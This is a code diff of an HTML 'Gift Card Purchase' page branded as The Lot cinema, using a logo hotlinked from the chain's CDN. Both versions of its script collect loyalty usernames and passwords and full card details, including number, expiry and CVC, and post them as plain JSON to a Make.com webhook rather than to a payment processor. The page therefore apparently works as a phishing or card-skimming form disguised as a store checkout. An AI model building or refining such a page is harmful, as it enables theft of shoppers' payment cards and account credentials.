@@ -5,127 +5,191 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Gift Card Purchase - The Lot</title>
   <style>
-    body {font-family: 'Helvetica Neue', Helvetica, sans-serif; background: #f5f5f5; margin: 0; padding: 2rem; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #003A7E;}
-    .container {background: #fff; padding: 2rem; border-radius: 16px; box-shadow: 0px 4px 12px rgba(0,0,0,0.1); max-width: 450px; width: 100%; text-align: center; position: relative;}
-    .section {display: none;}
-    .active {display: block;}
-    .controls, .buttons {display: flex; justify-content: center; gap: 1rem; margin: 1.5rem 0;}
-    button, .continue-button, .btn {background: #003A7E; color: #fff; border: none; padding: 1rem; border-radius: 12px; font-size: 1.2rem; cursor: pointer; text-decoration: none; transition: background-color .3s;}
-    button:hover, .continue-button:hover, .btn:hover {background: #3D93F7;}
-    input, select {width: 100%; padding: 1rem; font-size: 1rem; border: 2px solid #003A7E; border-radius: 12px; box-sizing: border-box;}
+    :root {
+      --primary-dark: #003A7E;
+      --primary-light: #3D93F7;
+      --bg-light: #f5f5f5;
+      --card-bg: #ffffff;
+      --shadow: rgba(0, 0, 0, 0.1);
+      --radius: 16px;
+      --font: 'Helvetica Neue', Helvetica, sans-serif;
+    }
+    * {box-sizing: border-box; margin: 0; padding: 0;}
+    body {
+      font-family: var(--font);
+      background: var(--bg-light);
+      color: var(--primary-dark);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 2rem;
+    }
+    .container {
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      box-shadow: 0 4px 12px var(--shadow);
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+    }
+    header {
+      background: var(--primary-dark);
+      padding: 1.5rem;
+      text-align: center;
+    }
+    header img {width: 160px;}
+    main {padding: 2rem;}
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1.5rem;
+      color: var(--primary-dark);
+      text-align: center;
+    }
+    .giftcard-image {
+      display: block;
+      margin: 0 auto 1.5rem;
+      width: 100%;
+      max-width: 250px;
+      border-radius: var(--radius);
+    }
+    .controls, .buttons {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    button, .btn {
+      background: var(--primary-dark);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover, .btn:hover {background: var(--primary-light);}
+    input, select {
+      width: 100%;
+      padding: 1rem;
+      font-size: 1rem;
+      border: 2px solid var(--primary-dark);
+      border-radius: var(--radius);
+      background: #fff;
+    }
     input[readonly] {background: #e9ecef; cursor: not-allowed;}
+    label {display: block; margin-bottom: 0.5rem; font-weight: bold;}
     #loading {
       display: none;
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(255,255,255,0.8);
-      border-radius: 16px;
+      border-radius: var(--radius);
+      display: flex;
       align-items: center;
       justify-content: center;
       font-size: 1.2rem;
       font-weight: bold;
-      color: #003A7E;
+      color: var(--primary-dark);
       z-index: 10;
     }
-    .logo-area {background:#3D93F7; padding:1.5rem; border-radius:16px; margin-bottom:2rem;}
-    .logo {width:180px;}
-    .giftcard-image {width:250px; border-radius:12px;}
-    @media (max-width:480px){.logo{width:140px}.giftcard-image{width:200px}}
+    footer {text-align: center; padding: 1rem; font-size: 0.9rem; color: #666;}
   </style>
 </head>
 <body>
   <div class="container">
-    <div id="loading">Please wait...</div>
-    <div class="logo-area">
-      <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo" class="logo">
-    </div>
-    <!-- Section: Amount Selection -->
-    <div id="section-amount" class="section active">
-      <h1>Select Gift Card Value</h1>
-      <img src="https://via.placeholder.com/250x150?text=Gift+Card" alt="Gift Card" class="giftcard-image">
-      <div class="controls">
-        <button id="decrease">-</button>
-        <input type="text" id="amount" value="100" readonly>
-        <button id="increase">+</button>
-      </div>
-      <button id="to-loyalty">Continue</button>
-    </div>
-    <!-- Section: Loyalty Login -->
-    <div id="section-loyalty" class="section">
-      <h1>Loyalty Login</h1>
-      <form id="loginForm">
-        <input type="text" id="loyaltyUser" placeholder="Username" />
-        <input type="password" id="loyaltyPass" placeholder="Password" />
-        <div class="buttons">
-          <button type="button" id="skipLogin">Skip</button>
-          <button type="submit">Login</button>
+    <div id="loading">Processing...</div>
+    <header><img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo"></header>
+    <main>
+      <!-- Amount -->
+      <section id="sec-amount" class="active">
+        <h1>Select Gift Card Value</h1>
+        <img src="https://via.placeholder.com/250x150?text=Gift+Card" alt="Gift Card" class="giftcard-image">
+        <div class="controls">
+          <button id="dec">-</button>
+          <input type="text" id="amount" value="100" readonly>
+          <button id="inc">+</button>
         </div>
-      </form>
-    </div>
-    <!-- Section: Payment Form -->
-    <div id="section-payment" class="section">
-      <h1>Payment Details</h1>
-      <form id="paymentForm">
-        <input type="email" id="customer_email" placeholder="Email" required />
-        <input type="tel" id="customer_phone" placeholder="Phone" required />
-        <select id="card_type" required>
-          <option value="">Card Type</option><option>Visa</option><option>Mastercard</option><option>AMEX</option>
-        </select>
-        <input type="text" id="card_name" placeholder="Name on Card" required />
-        <input type="text" id="card_number" placeholder="Card Number" maxlength="16" required />
-        <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5" required />
-        <input type="text" id="card_cvc" placeholder="CVC" maxlength="4" required />
-        <label>Amount</label>
-        <input type="text" id="amount_display" readonly />
-        <input type="hidden" id="amount_hidden">
-        <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
-        <button type="submit">Pay</button>
-      </form>
-    </div>
-    <!-- Section: Thank You -->
-    <div id="section-thanks" class="section">
-      <h1>Thank You!</h1>
-      <p>Your purchase is confirmed. You'll receive a confirmation email shortly.</p>
-      <a href="#" class="btn" id="finish">Finish</a>
-    </div>
+        <button id="next-loyalty">Continue</button>
+      </section>
+      <!-- Loyalty -->
+      <section id="sec-loyalty">
+        <h1>Loyalty Login</h1>
+        <form id="frm-loyalty">
+          <input type="text" id="user" placeholder="Username" />
+          <input type="password" id="pass" placeholder="Password" />
+          <div class="buttons">
+            <button type="button" id="skip">Skip</button>
+            <button type="submit">Login</button>
+          </div>
+        </form>
+      </section>
+      <!-- Payment -->
+      <section id="sec-pay">
+        <h1>Payment Details</h1>
+        <form id="frm-pay">
+          <input type="email" id="email" placeholder="Email" required />
+          <input type="tel" id="phone" placeholder="Phone" required />
+          <label for="card_type">Card Type</label>
+          <select id="card_type" required>
+            <option value="">Select Card</option><option>Visa</option><option>Mastercard</option><option>AMEX</option>
+          </select>
+          <input type="text" id="name" placeholder="Name on Card" required />
+          <input type="text" id="number" placeholder="Card Number" maxlength="16" required />
+          <div class="controls">
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required style="width:45%;">
+            <input type="text" id="cvc" placeholder="CVC" maxlength="4" required style="width:45%;">
+          </div>
+          <label>Amount</label>
+          <input type="text" id="amt-display" readonly>
+          <input type="hidden" id="amt-hidden">
+          <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
+          <button type="submit">Pay</button>
+        </form>
+      </section>
+      <!-- Thanks -->
+      <section id="sec-thanks">
+        <h1>Thank You!</h1>
+        <p>Your order is confirmed. Check your email for details.</p>
+        <button class="btn" id="finish">Finish</button>
+      </section>
+    </main>
+    <footer>&copy; The Lot Liberty Station</footer>
   </div>
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
-    // Section navigation
-    const sections = ['amount','loyalty','payment','thanks'].map(id=>document.getElementById('section-'+id));
-    function show(id){sections.forEach(s=>s.id===id? s.classList.add('active'):s.classList.remove('active'));}
-    // Amount controls
-    let amount = 100; const amtInput=document.getElementById('amount');
-    document.getElementById('decrease').onclick=()=>{if(amount>5){amount-=5;amtInput.value=amount}};
-    document.getElementById('increase').onclick=()=>{if(amount<500){amount+=5;amtInput.value=amount}};
-    document.getElementById('to-loyalty').onclick=()=>{show('section-loyalty')};
-    // Loyalty
-    document.getElementById('skipLogin').onclick=()=>{
-      preparePayment('');show('section-payment');
+    const secs = ['amount','loyalty','pay','thanks'].map(i=>document.getElementById('sec-'+i));
+    function show(i){secs.forEach(s=>s.id.endsWith(i)?s.classList.add('active'):s.classList.remove('active'));}
+    // amount
+    let amt=100;
+    const ai=document.getElementById('amount');
+    document.getElementById('dec').onclick=()=>{if(amt>5){amt-=5;ai.value=amt}};
+    document.getElementById('inc').onclick=()=>{if(amt<500){amt+=5;ai.value=amt}};
+    document.getElementById('next-loyalty').onclick=()=>show('loyalty');
+    // loyalty
+    document.getElementById('skip').onclick=()=>{prep();show('pay');};
+    document.getElementById('frm-loyalty').onsubmit=e=>{
+      e.preventDefault();
+      const u=document.getElementById('user').value.trim(),p=document.getElementById('pass').value.trim();
+      if(!u||!p){return alert('Enter credentials');}
+      document.getElementById('loading').style.display='flex';
+      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:u,loyaltyPass:p,amount:amt})})
+      .then(r=>r.json()).then(r=>{document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode!==0) return alert(r.ErrorDescription||'Invalid'); prep(); show('pay');}).catch(()=>{document.getElementById('loading').style.display='none'; alert('Error');});
     };
-    document.getElementById('loginForm').addEventListener('submit',e=>{
-      e.preventDefault();const user=document.getElementById('loyaltyUser').value.trim(),pass=document.getElementById('loyaltyPass').value.trim();
-      if(!user||!pass){alert('Enter credentials');return;}
+    function prep(){document.getElementById('amt-display').value=amt;document.getElementById('amt-hidden').value=amt;}
+    // payment
+    document.getElementById('frm-pay').onsubmit=async e=>{
+      e.preventDefault();const rec=grecaptcha.getResponse(); if(!rec) return alert('Complete reCAPTCHA');
+      const data={customer_email:document.getElementById('email').value,customer_phone:document.getElementById('phone').value,card_type:document.getElementById('card_type').value,card_name:document.getElementById('name').value,card_number:document.getElementById('number').value,card_expiry:document.getElementById('expiry').value,card_cvc:document.getElementById('cvc').value,amount:amt,'g-recaptcha-response':rec};
       document.getElementById('loading').style.display='flex';
-      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:user,loyaltyPass:pass,amount})})
-      .then(r=>r.json()).then(res=>{document.getElementById('loading').style.display='none';
-        if(res.ExtendedResultCode!==0){alert(res.ErrorDescription||'Invalid');return;} 
-        preparePayment(res.LoyaltySessionToken||'');show('section-payment');
-      }).catch(()=>{document.getElementById('loading').style.display='none';alert('Error')});
-    });
-    // Prepare payment form
-    function preparePayment(token){document.getElementById('amount_display').value=amount;document.getElementById('amount_hidden').value=amount;}
-    // Payment submission
-    document.getElementById('paymentForm').addEventListener('submit',async e=>{
-      e.preventDefault();const rec=grecaptcha.getResponse();if(!rec){alert('Complete reCAPTCHA');return;}      
-      const formData={customer_email:document.getElementById('customer_email').value,customer_phone:document.getElementById('customer_phone').value,card_type:document.getElementById('card_type').value,card_name:document.getElementById('card_name').value,card_number:document.getElementById('card_number').value,card_expiry:document.getElementById('card_expiry').value,card_cvc:document.getElementById('card_cvc').value,amount:amount,'g-recaptcha-response':rec};
-      document.getElementById('loading').style.display='flex';
-      try{const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(formData)});
-        const txt=await res.text();const parsed=JSON.parse(txt),result=Array.isArray(parsed)?parsed[0]:parsed;
-        if(result.ExtendedResultCode===0) show('section-thanks'); else alert(result.ErrorDescription||'Payment error');
-      }catch{alert('Error');}finally{document.getElementById('loading').style.display='none'}
-    });
-    document.getElementById('finish').onclick=()=>window.location.reload();
+      try{const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+        const txt=await res.text();const obj=JSON.parse(txt),r=Array.isArray(obj)?obj[0]:obj;
+        document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode===0) show('thanks'); else alert(r.ErrorDescription||'Error');
+      }catch{document.getElementById('loading').style.display='none';alert('Error');}
+    };
+    document.getElementById('finish').onclick=()=>location.reload();
   </script>
 </body>
 </html>
